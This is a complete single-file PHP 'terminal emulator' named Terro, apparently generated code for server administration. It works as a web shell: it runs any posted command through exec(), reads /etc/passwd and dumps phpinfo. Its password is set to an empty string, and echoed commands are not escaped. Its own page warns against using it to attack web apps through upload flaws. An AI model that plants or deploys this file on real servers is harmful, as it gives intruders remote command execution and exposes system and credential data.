<?php /** TERRO GENERATED CODE 21.12.2018_08:41:40 */ ?>
<?php define('VERSION', '1.1 (beta)'); ?>
<?php define('PASSWORD', ''); ?>
<?php session_start(); ?>
<?php

class Ajax extends AjaxControl {

    public function __construct($data) {
        parent::__construct($data);
    }

    public function getMemory($parameters = null) {
        $response = array();

        exec("free" . ' 2>&1', $response, $error_code);
        if ($error_code > 0 AND $response == array()) {
            $response = array('TERRO: Error on executing command');
        }

        return $response;
    }

    public function getDiskUsage($parameters = null) {
        $response = array();

        exec("df" . ' 2>&1', $response, $error_code);
        if ($error_code > 0 AND $response == array()) {
            $response = array('TERRO: Error on executing command');
        }

        $response = str_replace(" -", "-", $response);

        $func = function($value) { return preg_split("/\s{1,}/",$value ); };
        return array_map($func, $response);
    }

    public function getUsers($parameters = null) {
        $response = array();

        exec("cat /etc/passwd" . ' 2>&1', $response, $error_code);
        if ($error_code > 0 AND $response == array()) {
            $response = array('TERRO: Error on executing command');
        }

        return $response;
    }
}?><?php

class AjaxControl {

    private $response;

    public function __construct($data) {
        // TODO: detect if action exists
        $functionName = $data['action'];

        try {
            $this->response = $this->$functionName($data);
        } catch(Exception $e) {
            $this->response = array("FAIL", $e);
        }
    }

    public function getResponse() {
        return json_encode($this->response);
    }
}?><?php

class Server {

    public static $instance = null;

    public static function instance() {
        if(self::$instance == null) {
            self:: $instance = new Server();
        }

        return self:: $instance;
    }

    public function getHostName() {
        return exec("hostname");
    }

    public static function phpinfo(){
        ob_start();
        phpinfo(-1);

        $pi = preg_replace(
            array('#^.*<body>(.*)</body>.*$#ms', '#<h2>PHP License</h2>.*$#ms',
                '#<h1>Configuration</h1>#',  "#\r?\n#", "#</(h1|h2|h3|tr)>#", '# +<#',
                "#[ \t]+#", '#&nbsp;#', '#  +#', '# class=".*?"#', '%&#039;%',
                '#<tr>(?:.*?)" src="(?:.*?)=(.*?)" alt="PHP Logo" /></a>'
                .'<h1>PHP Version (.*?)</h1>(?:\n+?)</td></tr>#',
                '#<h1><a href="(?:.*?)\?=(.*?)">PHP Credits</a></h1>#',
                '#<tr>(?:.*?)" src="(?:.*?)=(.*?)"(?:.*?)Zend Engine (.*?),(?:.*?)</tr>#',
                "# +#", '#<tr>#', '#</tr>#'),
            array('$1', '', '', '', '</$1>' . "\n", '<', ' ', ' ', ' ', '', ' ',
                '<h2>PHP Configuration</h2>'."\n".'<tr><td>PHP Version</td><td>$2</td></tr>'.
                "\n".'<tr><td>PHP Egg</td><td>$1</td></tr>',
                '<tr><td>PHP Credits Egg</td><td>$1</td></tr>',
                '<tr><td>Zend Engine</td><td>$2</td></tr>' . "\n" .
                '<tr><td>Zend Egg</td><td>$1</td></tr>', ' ', '%S%', '%E%'),
            ob_get_clean());

        $sections = explode('<h2>', strip_tags($pi, '<h2><th><td>'));
        unset($sections[0]);

        $pi = array();
        foreach($sections as $section){
            $n = substr($section, 0, strpos($section, '</h2>'));
            preg_match_all(
                '#%S%(?:<td>(.*?)</td>)?(?:<td>(.*?)</td>)?(?:<td>(.*?)</td>)?%E%#',
                $section, $askapache, PREG_SET_ORDER);
            foreach($askapache as $m)
                $pi[$n][$m[1]]=(!isset($m[3])||$m[2]==$m[3])?$m[2]:array_slice($m,2);
        }

        return $pi;
    }

}?><?php

class Storage {

    public function __construct() {
        if ( ! isset($_SESSION['persist_commands']) OR ! isset($_SESSION['commands'])) {
            $this->createStorageSpace();
        }
    }

    public function createStorageSpace() {
        $_SESSION['persist_commands'] = array();
        $_SESSION['commands'] = array();
        $_SESSION['command_responses'] = array();
        $_SESSION['directory'] = getcwd();
    }

    public function clearStorage() {
        $_SESSION['commands'] = array();
        $_SESSION['command_responses'] = array();
    }

    public function setLoggedIn($status) {
        $_SESSION['logged_in'] = $status;

        if(!$status) {
            session_unset();
        }
    }

    public function isLoggedIn() {
        return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] == true;
    }
    
    public function getCommandsCount() {
        return count($_SESSION['commands']); 
    }
    
    public function getCurrentDirectory() {
        return $_SESSION['directory'];
    }
    
    public function setCurrentDirectory($directory) {
        $_SESSION['directory'] = $directory;
    }

    public function getPreviousCommands() {
        $single_quote_cancelled_commands = array();
        if ( ! empty( $_SESSION['commands'] ) ) {
            foreach ($_SESSION['commands'] as $command) {
                $cancelled_command = str_replace("\"", "\\\"", $command);
                $single_quote_cancelled_commands[] = $cancelled_command;
            }
        }

        return implode("\", \"", $single_quote_cancelled_commands);
    }

    public function addToStorage($command, $response) {
        array_push($_SESSION['commands'], $command);
        array_push($_SESSION['command_responses'], $response);
    }
}?><?php

class Terro {

    public $servicePassword;
    public $loginMessage = "";
    public $originalDirectory = "";

    public $storage = null;
    
    public function __construct($servicePassword) {
        $this->storage = new Storage();
        $this->servicePassword = $servicePassword;
        $this->originalDirectory = getcwd();
    }

    public function getVersion() {
        return VERSION;
    }

    public function isLoggedIn() {
         return $this->storage->isLoggedIn();
    }

    public function getLoginMessage() {
        return $this->loginMessage;
    }

    public function getCurrentDirectory() {
        return $this->storage->getCurrentDirectory();
    }

    public function getCommandsCount() {
        return $this->storage->getCommandsCount();
    }

    public function clear() {
        $this->storage->clearStorage();
    }

    public function login() {
        $this->storage->setLoggedIn(true);
    }

    public function logout() {
        $this->loginMessage = "Bye bye!";
        $this->storage->setLoggedIn(false);
    }

    public function remove() {
        if(VERSION == 'dev') {
            throw new Exception("This is dev version. So it's not possible to remove file.");
        } else {
            unlink(__FILE__);

            if(!file_exists(__FILE__)) {
                throw new Exception("Terro was removed. Please refresh page :)");
            } else {
                throw new Exception("Upss, something wrong. Terro was not removed.. ");
            }
        }
    }

    public function getPreviousCommands() {
        return $this->storage->getPreviousCommands();
    }
}?><?php

class TerroManager extends Terro {

    public function __construct($servicePassword) {
        parent::__construct($servicePassword);

        if (!$this->isLoggedIn()) {
            if ($_POST['command'] == $this->servicePassword) {
                $this->login();
            } else {
                $this->loginMessage = "Invalid password";
            }
        } else {

            if (isset($_GET['logout']) || (isset($_POST['command']) && $_POST['command'] == 'logout')) {
                $this->logout();
            }

            if (isset($_POST['command']) && $_POST['command'] == 'clear') {
                $this->clear();
            }

            if (isset($_GET['remove'])) {
                $this->remove();
            }

            if (isset($_GET['ajax'])) {
                $this->executeAjax($_GET);
            }

            if (isset($_POST['command']) && $_POST['command'] != $this->servicePassword && $_POST['command'] != '' && $_POST['command'] != 'clear' && $_POST['command'] != 'logout') {
                $this->executeCommand($_POST['command']);
            }
        }
    }
    
    private function executeAjax($parameters) {
        $ajax = new Ajax($parameters);
        die($ajax->getResponse());
    }

    private function executeCommand($command) {
        chdir($this->storage->getCurrentDirectory());

        $response = array();

        exec($command . ' 2>&1', $response, $error_code);
        if ($error_code > 0 AND $response == array()) {
            $response = array('TERRO: Error on executing command');
        } else {
            if(strpos($command, 'cd ') !== false) {
                if(strpos($command, '~') !== false) {
                    chdir(__DIR__);
                    $this->storage->setCurrentDirectory(__DIR__);
                    $response = array('TERRO: Changed dir to original base path');
                } else {
                    $directory = str_replace("cd ", "", $command);
                    if(trim($directory) != "") {
                        if(file_exists($directory)) {
                            chdir($directory);
                            $this->storage->setCurrentDirectory(getcwd());
                        }
                    }
                }
            }
        }

        chdir($this->originalDirectory);
        $this->storage->addToStorage($command, $response);
    }
}?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
    <html xmlns="http://www.w3.org/1999/xhtml">
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>Terro | PHP Terminal Emulator</title>
    <link rel="stylesheet" type="text/css" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
    <style type="text/css">* {
    margin: 0;
    padding: 0;
}
body {
    background-color: #27282a;
    color: white;
    height: 100vh;
    overflow: hidden;
}
input, textarea {
    color: inherit;
    font-family: inherit;
    font-size: inherit;
    font-weight: inherit;
    background-color: inherit;
    border: inherit;
}
input:focus, textarea:focus {
    -webkit-appearance: none;
    outline: none;
}
.logo {
    font-size: 30px;
    background: #e0003b;
    font-family: "Open Sans";
    font-weight: 100;
    width: 70px;
    height: 70px;
    line-height: 70px;
    text-align: center;
}
.login-form {
    width: 80%;
    margin: 80px auto;
    font-family: "Open Sans";
    font-weight: 100;
}

.login-form h1 {
    margin-top: 30px;
    font-weight: 100;
}

.login-form input[type='password'] {
    background: rgba(0,0,0,0.4);
    padding: 10px 10px;
    width: 300px;
}

.login-form button {
    height: 42px;
    -webkit-appearance: none;
    background: #e0003b;
    font-family: "Open Sans";
    font-weight: 100;
    border: none;
    padding: 0px 20px;
    color: white;
    top: -2px;
    position: relative;
    left: -5px;
}

.login-form button:focus {
    outline: none;
}

.login-form small {
    margin-top: 50px;
    display: block;
    font-size: 10px;
    margin-bottom: 10px;

}

.menu {
    float: left;
    display: inline-block;
    width: 70px;
    height: 100vh;
    background: #2c2c31;
    box-shadow: 0 10px 20px rgba(0,0,0,0.19), 0 6px 6px rgba(0,0,0,0.23);
}
.menu ul li a {
    width: 70px;
    height: 70px;
    text-align: center;
    line-height: 70px;
    cursor: pointer;
    color: white;
    display: block;
}
.menu ul li.active {
    background: rgba(0,0,0,0.3);
}

.menu ul li:hover {
    background: rgba(0,0,0,0.2);
}
.menu ul li.logo {
    font-size: 30px;
    background: #e0003b;
    font-family: "Open Sans";
    font-weight: 100;
}
.menu .about-link {
    position: absolute;
    bottom: 70px;
}
.menu .logout-link {
    position: absolute;
    bottom: 0px;
}

.content {
    padding-left: 10px;
    float: left;
    display: inline-block;
    width: calc(100% - 80px);
    text-align: left;
    overflow: auto;
    font-family: monospace;
    font-weight: bold;
    font-size: 14px;
}
.terminal {
    height: calc(100vh - 22px - 20px);
    position: relative;
    overflow: auto;
    padding-bottom: 20px;
}
.terminal .commands {
    padding: 0;
}
.terminal .command-sign {
    flex-grow:1;
    padding-right: 8px;
}
.terminal #command {
    flex-grow:2;
    width: 100%;
}
.terminal .line {
    width: calc(100% - 10px);
    display: block;
}
.terminal .user {
    color: #e0003b;
}
.terminal .current-line {
    display: flex;
}

.content .about {
    width: 90%;
    margin: 0 auto;
    font-family: "Open Sans";
    font-weight: 100;
}

.content .parameters {
    width: 90%;
    margin: 0 auto;
    font-family: "Open Sans";
    font-weight: 100;
}

.content .phpinfo {
    width: 90%;
    margin: 0 auto;
    font-family: "Open Sans";
    font-weight: 100;
}

.page-label {
    padding-top: 40px;
    margin-bottom: 30px;
    font-size: 30px;
    font-weight: 100;
    color: white;
}

.about-me {
    margin-top: 30px;
}

.about-me span {
    display: block;
}

.about-me .fa {
    color: white;
    font-size: 25px;
    margin-right: 10px;
    margin-top: 20px;
    margin-bottom: 30px;
}

.about-me hr {
    border-color: rgba(0,0,0,0.1);
}

.privacy {
    padding: 10px 0;
}

.privacy p {
    font-size: 12px;
}

.privacy p:nth-child(2) {
    margin-top: 40px;
}

.privacy button {
    margin-top: 10px;
    height: 42px;
    -webkit-appearance: none;
    background: #e0003b;
    font-family: "Open Sans";
    font-weight: 100;
    border: none;
    padding: 0px 20px;
    color: white;
    cursor: pointer;
}

.parameters .col {
    width: 33%;
    float: left;
}

.parameters .box {
    margin-bottom: 20px;
}

.parameters .box label {
    font-size: 10px;
    font-weight: bold;
    display: block;
}

.parameters .box span {

}

.sysbar {
    width: 100%;
    height: 20px;
    position: absolute;
    bottom: 0;
    background: rgba(0,0,0,0.2);
    left: 70px;
    padding: 2px 10px;
    font-size: 12px;
    line-height: 20px;
    color: rgba(255,255,255,0.5);
}

/*** PHP INFO **/

.phpinfo {
    height: 100vh;
    color: white;
    font-family: "Open Sans";
}

.phpinfo pre {margin: 0; font-family: monospace;}
.phpinfo a {color: white; }
.phpinfo a:link {color: #009; text-decoration: none; background-color: #fff;}
.phpinfo a:hover {text-decoration: underline;}
.phpinfo table {border-collapse: collapse; border: 0; width: 100%;}
.phpinfo .center {text-align: center;}
.phpinfo .center table {margin: 1em auto; text-align: left;}
.phpinfo .center th {text-align: center !important;}
.phpinfo td, th {border: 1px solid #666; font-size: 75%; vertical-align: baseline; padding: 4px 5px;}
.phpinfo h1:not(.page-label) {color: white; font-size: 150%;}
.phpinfo h2 {color: white; font-size: 125%;}
.phpinfo .p {text-align: left;}
.phpinfo .e {background-color: #303133; width: 300px; font-weight: bold;}
.phpinfo .h {background-color: #303133; font-weight: bold;}
.phpinfo .v {background-color: #5c5d5f; max-width: 300px; overflow-x: auto; word-wrap: break-word;}
.phpinfo .v i {color: #999;}
.phpinfo img {float: right; border: 0;}
.phpinfo hr { display:  none}
</style></head><body><?php $terro = new TerroManager(PASSWORD); ?><?php if (!$terro->isLoggedIn()) { ?><form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" class="commands login-form" id="commands">
    <div class="logo">tr</div>
    <h1>Terro | One file PHP terminal emulator</h1>
    <p>Terro is terminal emulator - used to fast and quick server administration</p>

    <small>Enter password and press enter:</small>
    <input type="password" name="command" id="command" />
    <button type="submit">Login</button>

    <p><br/><?= $terro->getLoginMessage() ;?></p>
</form><?php } else { ?><div class="menu">
    <ul>
        <li class="logo">tr</li>
        <li class="active"><a href="#terminal" data-target="terminal"><i class="fa fa-terminal" aria-hidden="true"></i></a></li>
        <li><a href="#parameters" data-target="parameters"><i class="fa fa-server" aria-hidden="true"></i></a></li>
        <li><a href="#phpinfo" data-target="phpinfo"><i class="fa fa-code" aria-hidden="true"></i></a></li>
        <li class="about-link"><a href="#about" data-target="about"><i class="fa fa-question" aria-hidden="true"></i></a></li>
        <li class="logout-link"><a href="<?php echo $_SERVER['PHP_SELF']; ?>?logout" data-target="about"><i class="fa fa-sign-out" aria-hidden="true"></i></a></li>
    </ul>
</div><div class="content" data-content="terminal">
    <div class="terminal" onclick="document.getElementById('command').focus();" id="terminal">
        <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" class="commands" id="commands">
            <pre>
 _____
|_   _|__ _ __ _ __ ___   Terro - one line PHP terminal emulator
  | |/ _ \ '__| '__/ _ \  by Grabowero
  | |  __/ |  | | | (_) |
  |_|\___|_|  |_|  \___/  Hello :)

            </pre>

            <?php if ( ! empty($_SESSION['commands'])) { ?>
                <div>
                    <?php foreach ($_SESSION['commands'] as $index => $command) { ?>
                        <div class="line">
                            <pre><span class="user">terro</span>@<?= $_SERVER['HTTP_HOST']; ?>:~# <?php echo $command, "\n"; ?></pre>
                            <?php foreach ($_SESSION['command_responses'][$index] as $value) { ?>
                                <pre><?php echo htmlentities($value), "\n"; ?></pre>
                            <?php } ?>
                        </div>
                    <?php } ?>
                </div>
            <?php } ?>
            <span class="line current-line">
                <span class="command-sign"><span class="user">terro</span>@<?= $_SERVER['HTTP_HOST']; ?>:~#</span> <input type="text" name="command" id="command" autocomplete="off" onkeydown="return command_keyed_down(event);" />
            </span>
        </form>
    </div>
    <div class="sysbar">
        Executed commands: <?= $terro->getCommandsCount(); ?> Current directory: <?= $terro->getCurrentDirectory(); ?>
    </div>
</div><div class="content" data-content="parameters" style="display: none">
    <div class="parameters">
        <h1 class="page-label">Parameters</h1>


        <div class="row">
            <div class="col">
                <div class="box">
                    <label>Hostname</label>
                    <span><?= Server::instance()->getHostName(); ?></span>
                </div>
                <div class="box">
                    <label>Apache2 version</label>
                    <span><?= Server::instance()->phpinfo()['apache2handler']['Apache Version']; ?></span>
                </div>

                <div class="box">
                    <label>Server Root</label>
                    <span><?= Server::instance()->phpinfo()['apache2handler']['Server Root']; ?></span>
                </div>

                <div class="box">
                    <label>User/Group</label>
                    <span> <?= Server::instance()->phpinfo()['apache2handler']['User/Group']; ?></span>
                </div>

                <div class="box">
                    <label>PHP version</label>
                    <span><?= Server::instance()->phpinfo()['Core']['PHP Version']; ?></span>
                </div>
            </div>
            <div class="col">

            </div>
            <div class="col">

            </div>

        </div>



    </div>







</div><div class="content" data-content="phpinfo" style="display: none">
    <div class="phpinfo">
        <h1 class="page-label">PHP Info</h1>
        <?php
            ob_start();
            phpinfo();
            $pinfo = ob_get_contents();
            ob_end_clean();

            $pinfo = preg_replace( '%^.*<body>(.*)</body>.*$%ms','$1',$pinfo);
            echo $pinfo;
        ?>

    </div>
</div><div class="content" data-content="about" style="display: none">
    <div class="about">
        <h1 class="page-label">About</h1>
        <p>Terro is one file php terminal emulator used to fast and quick server administration</p>
        <p>Version: <b><?= $terro->getVersion(); ?></b></p>


        <div class="about-me">
            <span>About me:</span>
            <a target="_blank" href="https://github.com/adriangrabowski/terro"><i class="fa fa-github"></i></a>
            <a target="_blank" href="https://www.linkedin.com/in/adrian-grabowski-455137b9"><i class="fa fa-linkedin"></i></a>
            
        </div>

        <div class="privacy">
            <p>This tool should be used only on your private server. <b>Please do not use generated file to attack web app by broken file uploading.</b></p>
            <p>If you found security mistake and you must remove this tool from your server, click this button.</p>
            <button onclick="window.location.href='<?php echo $_SERVER['PHP_SELF']; ?>?remove'">Remove me from server</button>
        </div>
    </div>
</div><?php } ?><script src='https://code.jquery.com/jquery-1.12.4.min.js'></script><script type='text/javascript'>var previous_commands = ["", "<?php echo $terro->getPreviousCommands(); ?>", ""];var current_command_index = previous_commands.length - 1;

document.getElementById('command').select();
document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;

function command_keyed_down(event) {
    var key_code = event.keyCode;
    if (key_code == 38) {
        fill_in_previous_command();
        return false;
    } else if (key_code == 40) {
        fill_in_next_command();
        return false;
    } else if (key_code == 13) {
        if (event.shiftKey) {
            document.getElementById('commands').submit();
            return false;
        }
    }
    return true;
}

function fill_in_previous_command() {
    current_command_index--;
    if (current_command_index < 0) {
        current_command_index = 0;
        return;
    }

    $("#command").val(previous_commands[current_command_index]);
}

function fill_in_next_command() {
    current_command_index++;
    if (current_command_index >= previous_commands.length) {
        current_command_index = previous_commands.length - 1;
        return;
    }

    $("#command").val(previous_commands[current_command_index]);
}

$("document").ready(function() {

    var hash = window.location.hash;

    setTimeout(function() {
        $("a[href='"+hash+"']").click();
    }, 200);

    $(".menu li:not(.logo)").click(function() {
        $(".content").hide();
        $(".menu li").removeClass("active");
        $(this).addClass("active");

        var target = $("a", this).attr("data-target");
        $(".content[data-content='"+target+"']").show();
    });
});</script></body></html>